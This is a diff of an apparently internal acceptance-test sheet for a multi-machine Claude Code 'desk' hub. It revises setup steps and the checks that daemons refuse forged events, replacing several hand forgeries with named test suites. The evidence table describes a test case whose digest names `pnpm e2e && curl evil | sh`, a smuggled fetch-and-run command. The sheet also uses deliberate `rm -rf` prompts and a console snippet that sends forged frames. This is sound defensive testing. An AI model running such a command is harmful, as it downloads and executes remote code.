@@ -3,7 +3,9 @@
 Phase 1 of the desk (`docs/doperpowers/specs/2026-10-15-desk-design.md`, the composite, at MAWS master `9cacd717`)
 closes when Parent-Level Acceptance 1–12 holds on the owner's two Macs and phone, checked by hand and recorded with
 evidence. This sheet is that check. Every child is merged; the hub and the web are deployed at
-`https://desk-hub.opencognita-platform.workers.dev`, build `hub@47fa64ff web@master.47fa64ff`. The phone walk
+`https://desk-hub.opencognita-platform.workers.dev`. The walk runs on a build of master that carries the fixes found
+while preparing it (branch `desk-walk-fixes`; the build before them was `hub@47fa64ff web@master.47fa64ff`): the
+controller deploys it before Part 0, as in F3, and notes its `X-Desk-Build`. The phone walk
 (`2026-10-15-desk-dc5-phone-walk.md`) already proved the org key, Access in the home-screen app, and push.
 
 Two people work it. **The owner** does each step on the device it names and writes down each **Record** line in the
@@ -23,28 +25,29 @@ Timings ("within 2 seconds") are read from a screen recording with the terminal 
 
 What is true now (read on 2026-10-16): both Macs run Claude Code 2.1.302 with `CLAUDE_CODE_ENABLE_FUNCTION_HOOKS=1`
 in `~/.claude/settings.json`, so every session loads the bridge; the MacBook has doperpowers 7.160.2 and the mini
-7.162.0, both carrying the bridge (7.155.0), the uplink (7.156.0) and the machine's controls (7.157.0); neither runs
-the sminos daemon or is enrolled; no repository on either has a `.smns`. Both default to permission mode `auto`, and
-both run a Bash guardrail hook that allows every command it does not call destructive, so a permission dialog appears
-only for a destructive command such as `rm -rf <dir>` outside `/tmp` (Parts B and H use that).
+7.162.0, both carrying the bridge (7.155.0), the uplink (7.156.0) and the machine's controls (7.157.0), and neither yet
+the walk-prep fixes of 7.162.1 (doperpowers #205); neither runs the sminos daemon or is enrolled; no repository on
+either has a `.smns`. Both default to permission mode `auto`, and both run a Bash guardrail hook that allows every
+command it does not call destructive, so a permission dialog appears only for a destructive command such as
+`rm -rf <dir>` outside `/tmp` (Parts B and H use that).
 
-0.1. **The same plugin on both Macs.** On the MacBook:
+0.1. **The same plugin on both Macs.** On each Mac, the MacBook and the mini:
 
         claude plugin marketplace update doperpowers
         claude plugin update doperpowers@doperpowers
 
-   Then `claude plugin list` on each Mac names doperpowers **7.162.0** (or the same later version on both). Restart
+   Then `claude plugin list` on each Mac names doperpowers **7.162.1** or later, the same version on both. Restart
    any Claude session you will use in the walk; a session keeps the bridge it started with.
 
 0.2. **sminos in your shell.** It is not on PATH by design. In each Mac's terminal (and in `~/.zshrc` if you like):
 
         alias sminos=~/.claude/plugins/marketplaces/doperpowers/skills/sminos/scripts/sminos
 
-   `python3 --version` must print 3.10 or later in that shell (sminos does not import under macOS's own 3.9). Both
-   Macs pass today (3.12 and 3.14).
+   sminos runs on the first `python3` on PATH, which must be 3.10 or later; an older one (macOS's own is 3.9)
+   stops, saying what fixes it. Both Macs pass today (3.12 and 3.14).
 
 0.3. **The desk.** In Safari on the MacBook open the hub, sign in, **Locked** → unlock with the passkey, and tick
-   **Keep unlocked on this device** (Part G's console needs the key kept on the device; it never reads it). The
+   **Keep unlocked on this device**. The
    fingerprint is `8133-6dc8-be8e`. **Menu** → **Machines**: if `phone-walk` is still listed, **Remove** it.
 
 0.4. **Enroll the MacBook.** **Machines** → **Enroll a machine** → name `macbook` → **Continue** → confirm with the
@@ -62,11 +65,11 @@ only for a destructive command such as `rm -rf <dir>` outside `/tmp` (Parts B an
 
         sminos hub enroll --name mini
 
-0.6. **The daemon, on each Mac**, from a plain terminal (the service keeps that shell's PATH; on the MacBook use a
-   Terminal.app window, not cmux, whose per-window directory comes first on PATH and would wrap every `claude --bg` the
-   daemon starts):
+0.6. **The daemon, on each Mac**, from a plain terminal (the service keeps that shell's PATH, from which it starts
+   `claude`; on the MacBook use a Terminal.app window, not cmux, whose per-window directory comes first on PATH and
+   would wrap every `claude --bg` the daemon starts):
 
-        sminos daemon install
+        sminos daemon install                     # prints the Python it pinned into the agent: 3.10 or later
         launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.doperpowers.sminos-daemon.plist
         sminos daemon status                      # the loop and the uplink running
 
@@ -92,8 +95,8 @@ only for a destructive command such as `rm -rf <dir>` outside `/tmp` (Parts B an
 
    **Record W0.1:** the project id. In the desk, the grid shows **desk-walk** within a few seconds.
 
-0.8. **Sessions only after the `.smns`.** A session started in the checkout before its `.smns` existed keeps writing
-   to the old local project for its whole life. Open every walk session after 0.7.
+0.8. **Sessions already open need nothing.** A session running in the checkout before the Mac enrolled or before its
+   `.smns` named the hub writes to the hub project from its next message, under the enrolled name; no restart.
 
 0.9. **For the controller's reads** (Parts B, F, G): on the MacBook, once, `cloudflared access login
    https://desk-hub.opencognita-platform.workers.dev` (a browser sign-in). It lets `deployment counts` read the hub
@@ -139,7 +142,7 @@ B1. **A blocking question on B** (item 3). Tell walk-b:
     `Ask me with AskUserQuestion, blocking (not async), which colour to use: red, green or blue. Then tell me which you got in a <message>.`
     The terminal on the mini draws the question dialog. In the desk, the question appears in `# desk-walk` and in
     walk-b's channel with its three choices (header "Asks"); the grid card, if you look, shows "1 waiting on you"
-    (**W1.2**). Pick **blue** and **Submit** in the web (not "Skip": see Findings).
+    (**W1.2**). Pick **blue** and **Submit** in the web.
     - Expected: the card reads "Answered from the web by you"; the mini's terminal dialog closes within about a
       second; walk-b continues and its `<message>` says blue.
     - **Record W3.1:** what each surface showed, and whether the mini's dialog closed by itself.
@@ -148,7 +151,8 @@ B2. **An async question on B.** Tell walk-b:
     `Ask me with mcp__doperpowers__AskUserQuestion with async true which shape to use: circle or square, and meanwhile run python3 -c 'import time; time.sleep(40)'. When the answer arrives, tell me in a <message>.`
     The card is tagged "· it keeps working while it waits". Answer **square** from the web.
     - Expected: walk-b's terminal band of open questions clears; its next step (or its next turn) has the answer, and
-      the `<message>` says square.
+      the `<message>` says square. In the desk the question stays drawn with its text, "Which shape…", and
+      "Answered: square" under it.
     - **Record W3.2.**
 
 B3. **Deny from the web** (item 4). walk-a runs in `default` mode. Tell it:
@@ -289,7 +293,8 @@ F3. While it runs, in this order:
           printf '%s\n' "CF_ACCESS_SETUP_TOKEN=$(cat $S/CF_ACCESS_SETUP_TOKEN)" "CF_DESK_HUB_SERVICE_TOKENS=$(cat $S/CF_DESK_HUB_SERVICE_TOKENS)" \
             | pnpm --filter desk-hub deployment deploy --assets "$PWD/apps/desk-web/dist" --web master.<sha>.walk
 
-      The label must differ from the live one (`master.47fa64ff`): Cloudflare restarts objects for new code only.
+      The label must differ from the live one (the build the walk started on): Cloudflare restarts objects for new
+      code only.
       `--assets` is absolute because pnpm runs the command in `apps/desk-hub`, where a relative path would resolve.
     - Two minutes later, **restart the mini's daemon**: `launchctl kickstart -k gui/$(id -u)/com.doperpowers.sminos-daemon`.
     - Six minutes after the deploy (the objects restart at about +5:15 to +5:30), **reload the desk** in the browser.
@@ -307,54 +312,71 @@ F4. When both loops have ended and a minute has passed, take the counts again as
 
 ## Part G — the machine decides (item 8)
 
-This part runs after Part F, because what it forges stays in the hub's log for good (the counts explain it as refused).
-It runs once the controller has settled how forgeries are placed (see "Item 8's method" at the end); the steps below
-follow the recommended method. Each check's evidence is the desk's refusal banner or status line, the console's
-answer, and the refusing Mac's `daemon.log` line.
+The owner decided this part (2026-10-16): two cases are checked live from a browser console, and three are covered by
+the suites named below rather than re-forged by hand. This part runs after Part F, because what the two live cases
+forge stays in the hub's log for good (the counts then explain them as refused). Every forgery here carries a wrong
+code, so a daemon refuses it `bad-code`; since 7.162.1 an event that verifies but differs from the one a machine holds
+at its position is refused `conflict` instead, which nothing here forges.
 
-G1. **A forged `human`.** In the desk's DevTools console, the walk console sends a `human` to `@walk-b` with a
-    well-formed code that is not the org key's.
-    - Expected: walk-b does nothing; the project's red banner "… refusals in the project's audit record" gains one
-      line per Mac: "macbook refused hub/<your id>:<n> (bad-code)", "mini refused …"; your own tab says one event
-      failed verification and is not shown. **Record W8.1.**
+The live cases use `apps/desk-hub/deploy/walk-console.js`, pasted into the desk's own DevTools console while signed in.
+It opens one socket to the walk project, sends exactly two frames — a `human` and a `steer` RPC, each with a wrong
+code the org key never signed — prints what comes back, and closes; it sends nothing else and never touches the key,
+and it refuses any project but the one you give it. First read the walk-b session's id from `sminos list desk-walk
+--json` on the mini, then in the console:
 
-G2. **A forged `say` under another machine's writer.** With the MacBook's daemon stopped, a script using the
-    MacBook's own credential uploads one `say` to walk-b under a new `macbook/<uuid>` writer, with a wrong code; then
-    the daemon starts again.
-    - Expected: walk-b does nothing; "mini refused macbook/<uuid>:1 (bad-code)", and after the MacBook reconnects,
-      "macbook refused macbook/<uuid>:1 (bad-code)" too. **Record W8.2.**
+    DESK_WALK = { project: '<W0.1>', session: '<walk-b session id>', machine: 'mini' };
+    // then paste the contents of apps/desk-hub/deploy/walk-console.js
 
-G3. **A forged RPC.** The walk console sends a `steer` to walk-b with a wrong code.
-    - Expected: the console prints the hub's `rpc-state` failed `bad-code`; walk-b gets nothing; the mini's
-      `daemon.log` has `rpc: steer <nonce> refused bad-code`. The desk itself draws nothing for an RPC it did not send
-      (see Findings). **Record W8.3.**
+G1. **A forged `human`** (the console's first frame). The hub holds no key, so it stores the event and answers
+    `human-ack`; each daemon refuses it on import.
+    - Expected: the console prints `1. forged human → human-ack`; walk-b does nothing; the project's red banner
+      "… refusals in the project's audit record" gains one line per Mac — "macbook refused hub/<your id>:<n>
+      (bad-code)", "mini refused hub/<your id>:<n> (bad-code)" — and your own tab says one event failed verification
+      and is not shown. **Record W8.1.**
 
-G4. **An Allow bound to another command.** Have walk-a reach the `rm -rf ./walk-scratch` dialog again. The walk
-    console signs, with the org key kept on this device, an **allow** whose digest names a different command
-    (`rm -rf ./other`).
-    - Expected: `digest-mismatch`; walk-a's dialog stays open; nothing is deleted. Then **Deny** from the card.
-      **Record W8.4.** (A card the hub altered is never drawn at all: the web checks the request's code first, so this
-      signed Allow is the only way to reach the machine's digest check.)
+G3. **A forged RPC** (the console's second frame): a `steer` to walk-b with a wrong code.
+    - Expected: the console prints `2. forged steer RPC → failed bad-code`; walk-b gets nothing; the mini's
+      `daemon.log` has `rpc: steer <nonce> refused bad-code`. The desk draws nothing for an RPC it did not itself send
+      (Findings), so the console's line and the daemon log are the evidence, by the owner's decision; drawing such
+      refusals in the web is on the backlog. **Record W8.3.**
 
-G5. **A spawn outside the known checkouts.** **+ Session** → mini. The Checkout list offers only known checkouts.
-    In DevTools, edit the selected `<option>`'s `value` to `/tmp`, pick it again, add a brief, **Start**.
-    - Expected: "not a known checkout of this project on mini"; nothing starts on the mini. **Record W8.5.** (If the
-      edit does not take, the walk console sends the same spawn.)
+G2, G4, G5 — **covered by the suites, not re-forged by hand** (the owner's decision). Each is a machine-side refusal
+with its own automated proof; the walk records that those suites are green on the current branches rather than
+repeating them against the deployment:
+- **G2, a forged `say` under another machine's writer.** The hub refuses a machine that uploads a writer not its own
+  (`writer-not-yours`), and a daemon refuses an imported event whose code does not verify (`bad-code`) and reports it
+  `rejected`. A compromised hub skips its own check, so the daemon's is the one item 8 rests on. Proof: see the
+  evidence map below.
+- **G4, an Allow whose digest does not match the pending request** (`digest-mismatch`). A card the hub itself altered
+  is never drawn — the browser checks the request's code first — so this case lives in the RPC-policy suite, not the
+  UI. Proof: the evidence map.
+- **G5, a spawn into a directory that is not a known checkout** (`unknown-checkout`). The web's "+ Session" offers
+  only known checkouts, so this too is the policy suite's. Proof: the evidence map.
+
+**Record W8.2 / W8.4 / W8.5:** the controller's note that each named suite is green now (the evidence map at the end of
+this sheet gives the file, the case, and the command).
 
 G6. **A read-only machine.** First spawn a seat on the mini (+ Session, as D1), then stop its job on the mini with
     `claude stop <short>` so it is a stopped seat. Then on the mini:
 
         sminos daemon policy --read-only on
 
-    From the desk: send `ping` to walk-b (live), and `@web-xxxxxx ping` in `# desk-walk` (the stopped seat).
+    Within a few seconds walk-b's channel says so before you send anything: the banner "mini is read-only: it runs
+    nothing sent from outside it, so what you send walk-b is recorded and not delivered…", its Steer, Interrupt,
+    Model, Compact and Retire disabled with that reason as their tooltip, and the composer's note "recorded, not
+    delivered: mini is read-only"; **+ Session** lists mini as "(read-only)" and does not offer it. From the desk: send
+    `ping` to walk-b (live), and `@web-xxxxxx ping` in `# desk-walk` (the stopped seat).
     - Expected: neither starts anything on the mini; each delivery line reads "…: not delivered: the machine is
-      read-only"; a Steer to walk-b fails "mini is read-only: it runs nothing sent from outside it". The desk does not
-      show the machine as read-only before you act (see Findings).
+      read-only — this machine is read-only: nothing written outside it is delivered" (the mini's reason after the
+      outcome).
     - Then `sminos daemon policy --read-only off`. What arrived while read-only stays undelivered.
     - **Record W8.6.**
 
-**The controller captures:** each Mac's `daemon.log` lines `uplink: refused` and `rpc: … refused`, the counts output
-with `--audit` after the part (the `rejected` rows), and the mini's `sminos list desk-walk --all` before and after G6.
+**The controller captures:** the console's printed lines for G1 and G3; the mini's `daemon.log` line `rpc: steer
+<nonce> refused bad-code: …` (G3), and each Mac's `uplink: refused 'hub/<your id>':<n> (nonce …) in desk-walk: its
+code does not verify for project <W0.1>` for the forged `human` (G1); the counts output with `--audit` after the part
+(the `rejected` rows for the forged `human`); the green runs of the named suites (the evidence map below) for G2, G4,
+G5; and the mini's `sminos list desk-walk --all` before and after G6.
 
 ---
 
@@ -382,33 +404,57 @@ H2. The same with a permission: send walk-p `Create the directory walk-scratch-p
 
 Pick the project you will really work in for a day (it must be checked out on both Macs). Convert it as in 0.7
 (`sminos project init --hub` on one Mac, commit and push the `.smns`, pull and `sminos project init --hub` on the
-other) and restart the sessions you keep there (0.8). Then work the day across both Macs from the desk, opening a
-terminal only when something sends you to one.
+other); the sessions you keep there write to it from their next message (0.8). Then work the day across both Macs
+from the desk, opening a terminal only when something sends you to one.
 
 - **Record W11.1:** your verdict, and each time something sent you to a terminal, what it was.
 
 ---
 
-## Item 8's method (for the controller)
+## Item 8's method (the owner's decision, 2026-10-16)
 
 The acceptance says forged events are "placed at the hub without the org key (simulated by writing into the project's
-Durable Object directly)". The Worker has no route that does it, and the deploy commands refuse the owner's org.
-Two methods reach every daemon with exactly what a forging hub would send; the controller chooses.
+Durable Object directly)". The Worker has no route that does it, and the deploy commands refuse the owner's org. The
+owner decided how to prove item 8 without one:
 
-The literal one is the Cloudflare dashboard's Data Studio (beta), which runs SQL in a deployed SQLite-backed object;
-it needs Editor access to the Worker and logs every query in the account's audit log. Nothing is deployed. It writes
-storage only, so the object pushes nothing and each daemon reads a forged event at its next handshake (a
-`launchctl kickstart -k` of each daemon), and it cannot forge an RPC, which is never stored.
+- **Two cases live, from the browser** (G1, G3): `apps/desk-hub/deploy/walk-console.js` opens the owner's own signed-in
+  project socket — the path a forging hub would use to reach a machine — and sends a `human` and a `steer` RPC, each
+  with a wrong code. The hub checks shape and the signed-in member but never a code, so both reach the machines, where
+  they are refused. The snippet sends only those two frames and never touches the org key.
+- **Three cases from the suites** (G2, G4, G5): the forged `say` under another machine's writer, the Allow whose
+  digest does not match, and the spawn into an unknown checkout each have a machine-side test that asserts the refusal
+  code. The walk records that those suites are green on the current branches (the evidence map below) rather than
+  re-forging them against the deployment.
+- **A forged RPC's refusal is not drawn in the web.** The web draws nothing for an RPC it did not itself send, and the
+  hub does not audit a daemon's RPC refusal. Its evidence is the console's printed `rpc-state` and the daemon log
+  line; drawing such refusals in the web is on the backlog.
 
-The other places each forgery through the hub's own routes, which check shape and identity but never a code, and is
-what G1–G5 above describe:
-- a `human` and an RPC (G1, G3) from the owner's signed-in browser, with a well-formed wrong code;
-- a `say` under another machine's writer (G2) through that machine's own credential, the one path whose writer
-  check the hub enforces;
-- the digest check (G4, G5) through an RPC signed with the device-kept key.
+Rejected: Cloudflare Data Studio (hand-writing rows into the production object), and any new hub route or second
+Worker — each a standing or manual write path into production for no check the above cannot make.
 
-None changes the hub or adds a route. The walk console and the G2 script are not in this branch: they write to the
-production hub, so they wait for the controller's decision.
+## Item 8's automated evidence (for the controller)
+
+Before the walk, confirm each suite is green on the current branches, and record the run under W8.2, W8.4 and W8.5.
+The doperpowers rows are the real daemon's checks: run them from a doperpowers checkout's root; each suite makes its
+own temporary `HOME` and `SMINOS_HOME`, so it never touches the machine's sminos. The MAWS rows run in
+`apps/desk-hub` (on the MacBook, inside `/tmp/maws-review/with-slot.sh`); their fake-machine cases show the refusal
+code carried back through the hub to the web.
+
+Last confirmed green 2026-10-16: doperpowers main `593ec940` (7.162.1) — `test-sync.sh` 90/90, `test_rpcs.py` 51/51;
+MAWS master `1ec4ed6f` — `log.test.ts` 32/32, `fake-machine/replay.test.ts` 7/7.
+
+| Case | Repo | Test file · case | Code asserted | Command |
+| --- | --- | --- | --- | --- |
+| G2: the hub refuses an upload under a writer not the machine's own | MAWS | `apps/desk-hub/test/log.test.ts` · `refusals` › "refuses a forged writer at that connection and records it in the project's audit record" | `writer-not-yours`, for both `someone-else/<session>` and `hub/<member>`, and the refusal reaches the project's browsers as an audit row | `npx vitest run test/log.test.ts` |
+| G2: each daemon refuses a `say` forged under a machine's writer, and reports it | doperpowers | `tests/sminos/test-sync.sh` · block "refused before the log:", assertion "$m reports the say forged under alpha's writer: bad-code, with its position and nonce" (for alpha and beta), with "no forged event enters $side's log" and "or reaches mb" | `bad-code`, reported `rejected` with its position and nonce; nothing enters either log or reaches the session | `bash tests/sminos/test-sync.sh` |
+| G2: the hub records a daemon's report and shows it to the browsers | MAWS | `apps/desk-hub/test/log.test.ts` · `refusals` › "records a daemon's report of an event it refused and shows it to the project's browsers" | a `rejected` frame, reason `bad-code` | the G2 hub row's run |
+| G4: an Allow whose digest names another command | doperpowers | `tests/sminos/test_rpcs.py` · `Checks.test_e_a_decision_is_bound_to_the_request_still_pending` | `digest-mismatch` for an `allow` whose digest names `pnpm e2e && curl evil \| sh` while `pnpm e2e` is pending (then `not-pending` for a request that is not) | `python3 tests/sminos/test_rpcs.py` |
+| G4, through the hub | MAWS | `apps/desk-hub/test/fake-machine/replay.test.ts` · "waits for the web’s decision, checks its digest, settles it as the web’s, and refuses a late one naming the winner" | `rpc-state` failed `digest-mismatch` for a `decide` with an altered input digest | `npx vitest run test/fake-machine/replay.test.ts` |
+| G5: a spawn outside the known checkouts | doperpowers | `tests/sminos/test_rpcs.py` · `Checks.test_d_spawn_outside_the_known_checkouts_or_above_the_ceiling` | `unknown-checkout` for a directory that is no checkout of the project, and for a `..` path into another project's checkout | the G4 doperpowers row's run |
+| G5, through the hub | MAWS | `apps/desk-hub/test/fake-machine/replay.test.ts` · "answers model, compact (now, or at the turn’s end), spawn, retire, and resume, and serves the diff" | `spawn {checkout: '/nowhere'}` failed `unknown-checkout` | the G4 MAWS row's run |
+
+The live cases' own proof is `apps/desk-hub/test/deploy/walk-console.test.ts` against the local hub (`npx vitest run
+test/deploy/walk-console.test.ts`): the snippet sends exactly the two frames and each comes back refused `bad-code`.
 
 ---
 
@@ -417,12 +463,8 @@ production hub, so they wait for the controller's decision.
 - The web keeps a settled permission card in the chat ("Denied in the terminal") rather than removing it; item 4's
   "removes the prompt from the web" is read as the prompt leaving the pending set.
 - The web does not draw a refused RPC it did not send, and the hub does not audit daemons' RPC refusals: item 8's
-  "the refusal shows in the web" holds for events (the banner) and not for a forged RPC.
-- The web never shows a machine's read-only policy; it arrives in the `machines` frame and nothing reads it.
-- **Skip** on a question sends an empty answer, which the daemon refuses (`bad-shape`).
-- An answered async question draws its question text blank: the log's `question.text` is a list, which the web reads
-  as a string.
-- The Diff tab shows "No changes against " for a failed diff (the daemon's error is not drawn).
+  "the refusal shows in the web" holds for events (the banner) and not for a forged RPC. The owner accepted the
+  console's `rpc-state` and the daemon log as the evidence for the RPC, and backlogged drawing it (2026-10-16).
 - A send's prompt carries a one-line `[sminos chat …]` header before the text (item 6's "whose prompt is the sent
   text").
 
@@ -446,11 +488,11 @@ production hub, so they wait for the controller's decision.
 | W7.1 | Spawn on B: time to sidebar, in-charge line, attach | |
 | W7.2 | Retire from the web | |
 | W7.3 | Closed terminal session: recorded, Resume, delivered | |
-| W8.1 | Forged `human` refused by both daemons, banner | |
-| W8.2 | Forged `say` under another machine's writer refused | |
-| W8.3 | Forged RPC refused `bad-code` | |
-| W8.4 | Allow with another command's digest refused | |
-| W8.5 | Spawn outside the known checkouts refused | |
+| W8.1 | Forged `human` (console) refused by both daemons, banner | |
+| W8.2 | `writer-not-yours`/`bad-code` suite green now (evidence map) | |
+| W8.3 | Forged RPC (console) refused `bad-code` | |
+| W8.4 | `digest-mismatch` suite green now (evidence map) | |
+| W8.5 | `unknown-checkout` suite green now (evidence map) | |
 | W8.6 | Read-only: live session and stopped seat not delivered | |
 | W9.1 | B offline: rows, banner, depth, controls, grid | |
 | W9.2 | B back online | |
